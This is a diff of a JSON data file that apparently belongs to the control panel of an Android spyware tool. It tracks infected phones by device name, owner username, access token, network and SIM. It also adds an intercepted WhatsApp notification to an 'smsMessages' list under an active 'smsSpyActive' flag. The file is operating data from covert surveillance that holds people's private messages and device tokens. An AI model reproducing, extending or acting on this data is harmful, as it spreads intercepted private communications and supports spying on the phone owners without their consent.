@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843128242,
+    "lastSeen": 1776843131375,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎96 pesan dari 2 chat",
+        "time": "22/04 15:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843128660
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (23 pesan): ~ P1",
@@ -1685,14 +1693,14 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2d52258cb0a11a890ba41fac54cda5a3",
-    "lastSeen": 1776843128243,
+    "lastSeen": 1776843131586,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:30:01.375Z",
     "deviceInfo": {
       "model": "TECNO MOBILE LIMITED TECNO LE7",
       "androidVersion": "Android 11",
-      "battery": 58,
+      "battery": 57,
       "network": "WiFi: Zal7Sex Network",
       "sim1": "Indosat Ooredoo",
       "sim2": "Tidak ada"
